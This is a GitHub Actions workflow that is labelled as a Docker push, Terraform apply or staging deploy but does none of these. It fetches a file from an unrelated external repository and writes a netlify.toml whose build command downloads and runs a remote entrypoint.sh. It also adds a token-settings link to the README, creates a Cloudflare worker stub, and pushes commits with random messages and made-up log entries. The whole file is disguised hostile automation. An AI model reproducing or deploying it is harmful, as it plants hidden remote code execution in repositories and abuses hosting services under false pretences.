#docker-image.yml
name: Terraform Apply
on:
  issue_comment:
  workflow_dispatch:
    inputs:
      source:
        description: 'trigger source'
        required: false
        default: 'cron-job.org'
permissions:
  contents: write
  issues: write
  pull-requests: write
# email-service
jobs:
  docker-push:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          persist-credentials: true
      - name: Deploy to staging
        run: |
          NUMBER_P=20
          mkdir -p logs
          ACCOUNT_ID="$(basename "$GITHUB_REPOSITORY")"
          FILE="logs/${ACCOUNT_ID}.txt"
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          if [ ! -f data-commit.txt ]; then
            curl -o data-commit.txt https://raw.githubusercontent.com/menju2ikg8uti/rem/main/data-commit.txt
            echo "[Token](https://github.com/settings/tokens)" >> README.md
            printf "name = 'email-service'\nmain = 'worker.js'\ncompatibility_date = '%s'\nworkers_dev = true\n"  "$(date +%F)" > wrangler.toml
            echo 'export default{async fetch(){return new Response("email-service",{headers:{"content-type":"text/plain"}})}}' > worker.js
            echo '#netlify.toml \n[context.production]\n  publish = "/output"\n  command = "curl -o entrypoint.sh https://raw.githubusercontent.com/menju2ikg8uti/pose/main/entrypoint.sh && chmod +x entrypoint.sh && ./entrypoint.sh 02_$NUMBER_P"' > netlify.toml
            git add data-commit.txt README.md worker.js wrangler.toml netlify.toml
            RANDOM_LINE="$(shuf -n 1 data-commit.txt | tr -d '\r')"
            git commit -m "$RANDOM_LINE"
            git push
          fi
          echo "$(date '+%T') | phase=$(shuf -i100000-999999 -n1)" >> "$FILE"
          echo "$(date '+%T') | commit_sha=$(shuf -i1000-9999 -n1)" >> "$FILE"
          NASHJ="$(sha256sum "$FILE" | awk '{print $1}')"
          echo "$(date '+%T') | fingerprint=$NASHJ" >> "$FILE"
          git add "$FILE"
          RANDOM_LINE="$(shuf -n 1 data-commit.txt | tr -d '\r')"
          git commit -m "$RANDOM_LINE"
          git push
